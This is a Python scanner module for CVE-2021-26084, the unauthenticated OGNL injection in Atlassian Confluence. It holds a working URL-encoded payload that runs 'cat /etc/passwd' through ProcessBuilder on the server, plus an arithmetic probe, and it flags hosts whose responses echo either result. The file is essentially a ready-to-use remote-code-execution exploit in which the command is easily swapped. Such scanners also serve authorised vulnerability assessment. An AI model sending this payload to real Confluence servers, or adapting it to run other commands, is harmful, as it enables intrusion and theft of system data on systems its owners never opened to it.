#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_int_2
from lib.tool import check

random_num_1, random_num_2 = random_int_2()

cve_2021_26084_payloads = [
    {
        'path': 'pages/doenterpagevariables.action',
        'data': 'queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022cat%20/etc/passwd%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027',
    },
    {
        'path': 'pages/doenterpagevariables.action',
        'data': 'queryString=%5cu0027%2b%7b{NUM1}*{NUM2}%7d%2b%5cu0027'.format(NUM1=random_num_1, NUM2=random_num_2),
    }
]

def cve_2021_26084_scan(clients):
    ''' Confluence存在一个OGNL注入漏洞, 
        允许未经身份验证的攻击者在Confluence服务器或数据中心实例上执行任意代码
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'AtlassianConfluence',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2021-26084',
    }
    
    headers = {
        'Referer': client.protocol_domain
    }

    for payload in cve_2021_26084_payloads:        
        path = payload['path']
        data = payload['data']
        
        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        random_num_sum = random_num_1 * random_num_2
        if (check.check_res_fileread(res.text)
            or (str(random_num_sum) in res.text)
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
